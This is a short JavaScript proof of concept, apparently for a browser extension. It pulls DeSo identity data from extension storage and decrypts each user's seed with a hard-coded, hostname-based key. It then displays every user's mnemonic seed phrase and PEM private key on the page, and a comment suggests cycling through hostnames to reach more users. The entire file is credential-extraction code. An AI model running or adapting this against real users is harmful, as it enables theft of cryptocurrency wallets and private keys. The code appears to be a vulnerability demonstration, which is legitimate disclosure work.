import {createDecipher} from 'crypto';
import KeyEncoder from 'key-encoder';

// Some JS for the extension index.html
(async function() {

  const forcedDesoWindow = window.open('https://identity.deso.org', '', 'height=1,width=1,resizeable=false');
  // Maybe close this window?

  const desoData = await chrome.storage.local.get('data');

  const users = JSON.parse(desoData.data.users);
  const entries = Object.entries(users)

  entries.map((k, v) => {
    const keyEncoder = new KeyEncoder('secp256k1');
    const encodedPrivateKey = keyEncoder.encodePrivate(decryptSeedHex(k[1].seedHex), 'raw', 'pem');

    document.getElementById('resp').innerHTML += `<h3>${k[0]}</h3>`;
    document.getElementById('resp').innerHTML += `<strong>Network</strong> ${k[1].network}<br />`;
    document.getElementById('resp').innerHTML += `<strong>Seed</strong> ${k[1].mnemonic}<br />`;
    document.getElementById('resp').innerHTML += `<strong>Encoded PK PEM</strong><br /> <textarea rows=10 cols=75>${encodedPrivateKey}</textarea><br />`;
    document.getElementById('resp').innerHTML += `<br /><br />`;
  })

  function decryptSeedHex(encryptedSeedHex, hostname) {
    const encryptionKey = seedHexEncryptionKey(hostname, false);
    const decipher = createDecipher('aes-256-gcm', encryptionKey);
    return decipher.update(Buffer.from(encryptedSeedHex, 'hex')).toString();
  }

  function seedHexEncryptionKey(hostname, reset) {
    // This is a Poc, we use diamondapp hostname as an example
    // but in the real world we can cycle through all the hostnames
    return `seed-hex-key-diamondapp.com`;
  }
})();